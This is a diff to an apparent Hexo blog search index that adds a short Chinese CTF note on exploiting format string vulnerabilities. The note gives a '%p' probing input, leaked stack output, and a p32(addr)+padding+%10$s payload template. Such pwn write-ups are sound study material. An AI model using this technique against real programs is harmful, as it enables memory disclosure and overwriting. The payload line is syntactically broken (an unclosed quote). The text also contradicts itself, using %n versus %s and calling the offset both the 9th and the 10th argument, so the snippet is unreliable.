@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>格式化字符串有感</title>
+      <link href="/2025/01/11/string/"/>
+      <url>/2025/01/11/string/</url>
+      
+        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p </span><br></pre></td></tr></table></figure><p>输入如上代码，来判断格式化字符串对应的地址，例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAA 0xfff6d33e 0xf7f495a0 0xf0b5ff 0xfff6d36e 0x1 0xc2 0x616d88fb 0xa30626e (nil) 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</span><br></pre></td></tr></table></figure><p>例如，上述打印结果。当<u><strong>后面打印内容与AAAA一致</strong></u>（实例中为第九个）时，很有可能就是格式化字符串的地址，可以看出我们的格式化字符串的地址是输出函数的第10个参数，但是是格式化字符串的第9个参数</p><p>此时，构造payload为 目标地址+填充+%order$n</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=p32(addr)+b&#x27;A*4+%10$s</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>c语言链表</title>
       <link href="/2024/12/17/%E2%80%9Clink%E2%80%9D/"/>
       <url>/2024/12/17/%E2%80%9Clink%E2%80%9D/</url>
